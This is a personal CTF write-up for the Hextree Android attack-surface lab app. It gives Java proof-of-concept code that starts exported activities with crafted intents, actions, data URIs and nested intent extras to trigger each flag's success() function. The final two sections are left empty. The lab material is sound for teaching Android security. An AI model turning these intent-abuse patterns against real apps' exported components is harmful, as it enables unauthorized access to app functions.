
2025-06-09 10:57

Source: #android #CTF 
# Activity  

Take the apk in jadx and check the android manifest to find activities related to flag
click on the flag activity and we see a call to success() function 
our goal is to reach the success() function in all of these challenges
#### 1 - basic exported activity

note the package name and complete class name 

write this java code in your POC app
```java
public void onClick(View view) {  
    Intent expintent = new Intent();  
    expintent.setClassName("io.hextree.attacksurface", "io.hextree.attacksurface.activities.Flag1Activity");  
    startActivity(expintent);  
}
```
#### 2 - Intent w extras

snippet from android manifest of flag2 
```xml
<intent-filter>
    <action android:name="io.hextree.action.GIVE_FLAG"/>
</intent-filter>
```

add the code below to the code we wrote for 1 - basic exported activity 
```java
expintent.setAction("io.hextree.action.GIVE_FLAG");
```
#### 3 - Intent w data URI

snippet from android manifest of flag 3 
```xml
<intent-filter>
    <action android:name="io.hextree.action.GIVE_FLAG"/>
    <data android:scheme="https"/>
</intent-filter>
```
on clicking flag4activity, it has an if loop that check if the data parsed has a particular URI, so we use that URI while creating the POC app

add the code below to the code we wrote for 1 - basic exported activity 
```java
expintent.setAction("io.hextree.action.GIVE_FLAG");
expintent.setData(Uri.parse("https://app.hextree.io/map/android"));
```

#### 4 - State machine 

when looking at the flag4activity code in jadx we see multiple actions nested in `if` loops - like so
```java
if (ordinal != 0) {
     if (ordinal != 1) {
        if (ordinal != 2) {
            if (ordinal == 3) {
                this.f.addTag(State.GET_FLAG);
                setCurrentState(State.INIT);
                success(this);
                Log.i("Flag4StateMachine", "solved");
                return;
            }
	        ...
        } else if ("GET_FLAG_ACTION".equals(action)) { ....
            Log.i("Flag4StateMachine", "Transitioned from BUILD to GET_FLAG");
            return;
        }
    } else if ("BUILD_ACTION".equals(action)) {
        ...
		... // more else if loops 
```

This hints that we might have to make multiple intents for every action 

```java
Intent exploitIntent3 = new Intent();  
exploitIntent3.setClassName("io.hextree.attacksurface","io.hextree.attacksurface.activities.Flag4Activity");  
exploitIntent3.setAction("GET_FLAG_ACTION");  
startActivity(exploitIntent3);  
  
Intent exploitIntent2 = new Intent();  
exploitIntent2.setClassName("io.hextree.attacksurface","io.hextree.attacksurface.activities.Flag4Activity");  
exploitIntent2.setAction("BUILD_ACTION");  
startActivity(exploitIntent2);  
  
Intent exploitIntent = new Intent();  
exploitIntent.setClassName("io.hextree.attacksurface","io.hextree.attacksurface.activities.Flag4Activity");  
exploitIntent.setAction("PREPARE_ACTION");  
startActivity(exploitIntent);
```
#### 5 - Intent in intent

jump through multiple intent to reach `success()`, below is the code snippet from `flag5activity` from `jadx`.
```java
public void onCreate(Bundle bundle) {
	    ...
        Intent intent = getIntent();
        Intent intent2 = (Intent) intent.getParcelableExtra("android.intent.extra.INTENT");
        if (intent2 == null || intent2.getIntExtra("return", -1) != 42) {
            return;
        }
        this.f.addTag(42);
        Intent intent3 = (Intent) intent2.getParcelableExtra("nextIntent");
        this.nextIntent = intent3;
        if (intent3 == null || intent3.getStringExtra("reason") == null) {
            return;
        }
        ... // similar patterned code ahead 
```

We will use `putExtra()` here to call intent in an intent
```java
public void onClick(View view) {  
    Intent nextIntent = new Intent();  
    nextIntent.setClassName("io.hextree.attacksurface","io.hextree.attacksurface.activities.Flag5Activity");  
    nextIntent.putExtra("reason", "back");  
 
    Intent middleIntent = new Intent();  
    middleIntent.setClassName("io.hextree.attacksurface","io.hextree.attacksurface.activities.Flag5Activity");  
    middleIntent.putExtra("return", 42);           
    middleIntent.putExtra("nextIntent", nextIntent);  
  
    Intent outerIntent = new Intent();  
    outerIntent.setClassName("io.hextree.attacksurface","io.hextree.attacksurface.activities.Flag5Activity");  
    outerIntent.putExtra("android.intent.extra.INTENT", middleIntent);  
    startActivity(outerIntent);  
}
```

#### 6 - 



#### 7 - 



## References
https://www.youtube.com/watch?v=jnBmI1eD-og
https://itsfading.github.io/posts/HexTree-Attack-Surface-App-Solutions/